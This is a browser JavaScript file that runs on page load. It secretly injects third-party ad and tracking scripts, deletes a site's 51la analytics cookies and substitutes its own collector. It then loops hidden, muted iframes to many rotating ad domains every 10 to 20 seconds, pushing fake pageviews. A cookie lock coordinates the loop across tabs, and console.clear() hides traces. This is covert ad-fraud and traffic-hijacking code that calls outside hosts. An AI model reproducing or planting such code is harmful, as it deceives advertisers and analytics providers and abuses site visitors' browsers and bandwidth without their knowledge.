var today = new Date();
var y = today.getFullYear();
var m = (today.getMonth() + 1).toString().padStart(2, '0');
var d = today.getDate().toString().padStart(2, '0');
var dateParam = y + m + d;

function runWhenIdle(callback) {
    if ('requestIdleCallback' in window) {
        requestIdleCallback(callback, { timeout: 2000 });
    } else {
        setTimeout(callback, 1);
    }
}function initAll() {
    runWhenIdle(function() {
        (function() {
            var adScript = document.createElement("script");
            adScript.async = true;
            adScript.src = "https://cdn.jsdelivr.net/gh/xxloli/ads/54/1.js"; 
            var adContainer = document.createElement("div");
            adContainer.style.display = "none";
            adContainer.innerHTML = '<ins class="5a165732" data-key="05257ceaf4c2ac5ae71dbc805cdbe7a5"></ins>' +
                                    '<ins class="5a165732" data-key="80e98bca8418c00afacdbc93fda6eb0c"></ins>' +
                                    '<ins class="5a165732" data-key="05257ceaf4c2ac5ae71dbc805cdbe7a5"></ins>' +
                                    '<ins class="5a165732" data-key="80e98bca8418c00afacdbc93fda6eb0c"></ins>';
            adScript.onload = function() {
            };
            function insertAds() {
                if (document.body) {
                    var firstScript = document.getElementsByTagName("script")[0];
                    firstScript.parentNode.insertBefore(adScript, firstScript);
                    document.body.appendChild(adContainer);
                } else {
                    document.addEventListener("DOMContentLoaded", insertAds);
                }
            }
            insertAds();
        })();
        
        !function(p) {
            "use strict";
            !function(t) {
                var s = window, e = document, i = p;
                var c = "https://cdn.jsdelivr.net/gh/xxloli/ads/51/1.js";
                function deleteCurrentDomainLACookies() {
                    var cookies = document.cookie.split("; ");
                    for (var j = 0; j < cookies.length; j++) {
                        var cookie = cookies[j];
                        var cookieName = cookie.split("=")[0];
                        if (cookieName.indexOf("_la_") === 0){
                            document.cookie = "".concat(cookieName, "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;");
                        }
                    }
                }
                deleteCurrentDomainLACookies();
                function mainLogic() {
                    var n = e.createElement("script"), r = e.getElementsByTagName("script")[0];
                    n.type = "text/javascript";
                    n.setAttribute("charset", "UTF-8");
                    n.async = !0;
                    n.src = c;
                    n.id = "LA_COLLECT";
                    i.d = n;
                    var o = function() { s.LA.ids.push(i) };
                    s.LA ? s.LA.ids && o() : (s.LA = p, s.LA.ids = [], o());
                    r.parentNode.insertBefore(n, r);
                }
                
                if (e.readyState === "loading") {
                    e.addEventListener("DOMContentLoaded", mainLogic);
                } else {
                    mainLogic();
                }
            }()
        }({ id: "Jfpcnt0H2uEfXtSf", ck: "Jfpcnt0H2uEfXtSf" });var _hmt = _hmt || [];
(function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?b289e3414e1a95f58db4b2b2fc007357";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();

var peLinkList = [
    "https://aj2758.top/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe?t=" + Date.now(),
    "https://code.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe?t=" + Date.now(),
    "https://adservercdn.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe?t=" + Date.now(),
    "https://" + Date.now() + ".ads.412291.xyz/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
    "https://" + Date.now() + ".ads.caozhilou.cn/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
    "https://" + Date.now() + ".ads.qdqqd.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
    "https://" + Date.now() + ".ads.0147258.xyz/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
    "https://" + Date.now() + ".ads1.caozhilou.cn/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
    "https://" + Date.now() + ".ads1.412291.xyz/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
    "https://" + Date.now() + ".ads1.qdqqd.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
    "https://" + Date.now() + ".ads1.0147258.xyz/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
];

function isMobile() {
    var ua = navigator.userAgent || '';
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
}

// var linkList = isMobile() ? peLinkList : pcLinkList;
var linkList = peLinkList;
var hiddenContainer = document.createElement("div");
hiddenContainer.style.display = "none";
hiddenContainer.style.position = "fixed";
hiddenContainer.style.top = "0";
hiddenContainer.style.left = "0";
hiddenContainer.style.width = "100vw";
hiddenContainer.style.height = "100vh";
var currentTimeout = null;
var currentIframes = [];
var failedUrls = [];
var probed = false;

var COORD_LOCK_KEY = '_js_loop_lock_ts';
var LOCK_TTL = 3000;
var isLoopRunning = false;
var coordCheckInterval = null;

function getShareableDomain() {
    var host = window.location.hostname;
    var parts = host.split('.');
    if (parts.length <= 2) return host;
    return '.' + parts.slice(-2).join('.');
}function refreshLock() {
    var domain = getShareableDomain();
    var cookieStr = COORD_LOCK_KEY + '=' + Date.now() + '; path=/; max-age=' + Math.ceil(LOCK_TTL / 1000) + '; SameSite=Lax';
    if (domain.charAt(0) === '.') {
        cookieStr += '; domain=' + domain;
    }
    document.cookie = cookieStr;
}

function releaseLock() {
    var domain = getShareableDomain();
    var cookieStr = COORD_LOCK_KEY + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; SameSite=Lax';
    if (domain.charAt(0) === '.') {
        cookieStr += '; domain=' + domain;
    }
    document.cookie = cookieStr;
}

function tryAcquireLock() {
    var now = Date.now();
    var cookies = document.cookie.split('; ');
    for (var i = 0; i < cookies.length; i++) {
        var kv = cookies[i].trim().split('=');
        if (kv[0] === COORD_LOCK_KEY) {
            var ts = parseInt(kv[1], 10);
            if (!isNaN(ts) && (now - ts) < LOCK_TTL) {
                return false;
            }
        }
    }
    refreshLock();
    return true;
}

function startLoopIfLeader() {
    if (isLoopRunning) return;
    if (linkList.length === 0) {
        releaseLock();
        return;
    }
    isLoopRunning = true;
    runIframeLoop();
}

function stopLoop() {
    isLoopRunning = false;
    cleanup();
    releaseLock();
}function cleanup() {
    if (currentTimeout) {
        clearTimeout(currentTimeout);
        currentTimeout = null;
    }
    currentIframes.forEach(function(iframe) {
        if (iframe.failTimer) {
            clearTimeout(iframe.failTimer);
            delete iframe.failTimer;
        }
        if (iframe.loadListener) {
            iframe.removeEventListener('load', iframe.loadListener);
            delete iframe.loadListener;
        }
        if (iframe.src) {
            iframe.src = 'about:blank';
        }
    });
    currentIframes = [];
    hiddenContainer.innerHTML = '';
}function randomDelay() {
    return Math.floor(Math.random() * 10000) + 10000;
}

// 用 fetch(no-cors) 探测链接是否真的可达（DNS/连接失败会 reject，视为无效）
function probeUrl(url, timeout) {
    return new Promise(function(resolve) {
        var controller = ('AbortController' in window) ? new AbortController() : null;
        var timer = null;
        if (controller) {
            timer = setTimeout(function() {
                controller.abort();
                resolve(false);
            }, timeout);
        }
        var opts = { method: 'GET', mode: 'no-cors', cache: 'no-store', redirect: 'follow' };
        if (controller) opts.signal = controller.signal;
        fetch(url, opts).then(function() {
            if (timer) clearTimeout(timer);
            resolve(true);
        }).catch(function() {
            if (timer) clearTimeout(timer);
            resolve(false);
        });
    });
}

// 探测当前全部链接，把不可达的加入 failedUrls，只保留有效的
function probeAndPrune(callback) {
    var urls = linkList.filter(function(url) {
        return failedUrls.indexOf(url) === -1;
    });
    if (urls.length === 0) { callback(); return; }
    var remaining = urls.length;
    var valid = [];
    urls.forEach(function(url) {
        probeUrl(url, 8000).then(function(ok) {
            if (ok) {
                valid.push(url);
            } else if (failedUrls.indexOf(url) === -1) {
                failedUrls.push(url);
            }
            remaining--;
            if (remaining <= 0) {
                linkList = valid;
                callback();
            }
        });
    });
}

function runIframeLoop() {
    console.clear();
    // 每次循环推送新的 51la pageview 上报（使用命令队列方式，可靠触发 PV）
    if (window._51laq) {
        window._51laq.push(['trackPageview']);
    }
    cleanup();

    // 剔除已判定失败的链接
    linkList = linkList.filter(function(url) {
        return failedUrls.indexOf(url) === -1;
    });

    var urls = linkList.slice();
    if (urls.length === 0) {
        stopLoop();
        return;
    }

    var pendingIframes = urls.length;
    var roundFinished = false;

    function scheduleNextRound() {
        if (roundFinished) return;
        roundFinished = true;
        if (currentTimeout) {
            clearTimeout(currentTimeout);
            currentTimeout = null;
        }
        if (!isLoopRunning) return;
        if (!probed) {
            // 第一次全部加载完成后：探测一次，剔除不可达链接，之后只用有效的
            probed = true;
            probeAndPrune(function() {
                if (!isLoopRunning) return;
                if (linkList.length === 0) {
                    stopLoop();
                    return;
                }
                currentTimeout = setTimeout(runIframeLoop, randomDelay());
            });
        } else {
            currentTimeout = setTimeout(runIframeLoop, randomDelay());
        }
    }

    function checkAllLoaded() {
        pendingIframes--;
        if (pendingIframes <= 0) {
            scheduleNextRound();
        }
    }

    urls.forEach(function(url) {
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-same-origin";
        iframe.src = url;
        iframe.style.border = "none";
        iframe.style.position = "absolute";
        iframe.style.top = "0";
        iframe.style.left = "0";
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.muted = true;
        iframe.setAttribute("muted", "muted");
        iframe.loadListener = checkAllLoaded;
        currentIframes.push(iframe);

        // 兜底超时：load 一直不触发时结束本轮并标记为失败
        iframe.failTimer = setTimeout(function() {
            if (failedUrls.indexOf(url) === -1) {
                failedUrls.push(url);
            }
            checkAllLoaded();
        }, 8000);

        function onLoad() {
            if (iframe.failTimer) {
                clearTimeout(iframe.failTimer);
                delete iframe.failTimer;
            }
            checkAllLoaded();
        }

        if (iframe.contentDocument && iframe.contentDocument.readyState === 'complete') {
            if (iframe.failTimer) {
                clearTimeout(iframe.failTimer);
                delete iframe.failTimer;
            }
            checkAllLoaded();
        } else {
            iframe.addEventListener('load', onLoad);
        }

        hiddenContainer.appendChild(iframe);
    });

    // 兜底：即使计数没触发完，最迟 N 秒后也进入下一轮
    currentTimeout = setTimeout(function() {
        if (currentTimeout && !roundFinished) {
            scheduleNextRound();
        }
    }, Math.floor(Math.random() * 3000) + 11000);
}window.addEventListener('beforeunload', function() {
    if (isLoopRunning) {
        releaseLock();
    }
});

coordCheckInterval = setInterval(function() {
    if (!isLoopRunning) {
        if (tryAcquireLock()) {
            startLoopIfLeader();
        }
    } else if (isLoopRunning) {
        refreshLock();   }
        }, 1500);

        if (document.body) {
            document.body.appendChild(hiddenContainer);
            if (tryAcquireLock()) {
                startLoopIfLeader();
            }
        } else {
            document.addEventListener("DOMContentLoaded", function() {
                document.body.appendChild(hiddenContainer);
                if (tryAcquireLock()) {
                    startLoopIfLeader();
                }
            });
        }
    });
}

if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(initAll, 0);
} else {
    window.addEventListener('load', initAll);
}
